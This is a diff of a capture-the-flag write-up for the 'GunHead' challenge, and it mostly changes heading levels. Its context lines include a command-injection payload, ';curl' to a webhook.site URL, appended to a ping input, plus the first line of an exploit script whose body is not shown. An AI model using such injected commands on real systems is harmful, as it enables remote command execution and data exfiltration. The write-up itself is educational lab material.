@@ -1,5 +1,5 @@
-## GunHead :: Easy
-#### Scenario 
+# GunHead :: Easy
+## Scenario 
 
 ```
 During Pandora's training, the Gunhead AI combat robot had been tampered with and was now malfunctioning, causing it to become uncontrollable.
@@ -7,7 +7,7 @@ With the situation escalating rapidly, Pandora used her hacking skills to infilt
  needs to take it down.
 ```
 
-#### Solve
+## Solve
 
 ![](/images/gunhead-source-tree.png)
 
@@ -91,7 +91,7 @@ We can then add our own command which will be executing, wether the ping command
 ;curl https://webhook.site/3578d2dc-d2dd-468b-a8c9-9bda1f8d1281;
 ```
 
-#### Exploit Script
+## Exploit Script
 
 ```python
 #!/usr/bin/env python3
